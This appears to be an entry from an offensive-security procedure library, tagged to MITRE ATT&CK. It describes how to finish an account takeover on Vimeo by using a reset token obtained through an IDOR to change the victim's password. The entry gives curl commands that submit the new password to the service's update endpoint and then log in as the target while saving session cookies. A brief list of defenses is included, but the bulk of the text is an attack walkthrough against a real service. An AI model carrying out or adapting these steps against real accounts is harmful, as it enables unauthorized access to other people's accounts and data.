---
id: proc-uuid-3
tags:
  - account-takeover
  - password-change
  - manipulation
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:25:29.928Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Complete-Password-Reset-and-Takeover-Account

## Summary

This procedure finalizes the IDOR exploitation by using the unauthorized reset token to change the target's password, resulting in full account control and takeover.

## Description

With the reset token in hand, this step submits a new password to the change endpoint, bypassing any further checks due to the IDOR. Upon success, the attacker can log in as the target, accessing videos, settings, and linked services. This represents the impact phase, potentially leading to data exfiltration or privilege abuse. The process is quick but should be done before token expiry. No additional tools beyond HTTP client are needed.

## Requirements

1. Valid reset token from prior step
2. Target account's email or basic details for login post-change
3. Secure channel to avoid token interception

## Defense

Defensive measures and detection strategies:

- Require email confirmation for all password changes
- Monitor for rapid successive resets or logins from new IPs
- Use multi-factor authentication to block unauthorized changes

## Objectives

1. Set new password for target account
2. Verify login and control
3. Assess post-takeover access levels

## Instructions

### Step 1: Submit New Password

**Context**: Use the token to access and update the password form.

Navigate to the reset URL or POST directly with the token and new credentials.

**Command** (curl example):
```bash
curl -X POST https://vimeo.com/api/password/update -d 'token=EXTRACTED_TOKEN&new_password=NewStrongPass123&confirm_password=NewStrongPass123' -H 'Content-Type: application/x-www-form-urlencoded'
```

> Updates the password. Expected output: Success message confirming change.

### Step 2: Login and Validate Takeover

**Context**: Test access with new credentials to confirm control.

Attempt login using target's email and new password.

**Command** (curl login simulation):
```bash
curl -X POST https://vimeo.com/api/login -d 'email=target@email.com&password=NewStrongPass123' -c cookies.txt
```

> Expected output: Auth token or redirect to dashboard, with cookies saved for session.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- account-takeover
- manipulation
